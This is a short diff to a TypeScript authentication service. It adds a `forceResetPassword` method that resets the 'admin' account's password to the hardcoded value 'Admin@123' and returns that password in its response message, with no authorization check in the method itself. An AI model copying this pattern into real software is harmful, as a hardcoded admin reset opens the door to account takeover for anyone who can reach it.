@@ -88,4 +88,15 @@ export class AuthService {
     
     return { message: 'Password changed successfully' };
   }
+
+  async forceResetPassword() {
+    const user = await this.usersRepository.findOne({ where: { username: 'admin' } });
+    if (!user) throw new Error('User not found');
+    
+    // Hash new password "Admin@123"
+    user.password_hash = await bcrypt.hash('Admin@123', 10);
+    await this.usersRepository.save(user);
+    
+    return { message: 'Password successfully reset to: Admin@123' };
+  }
 }
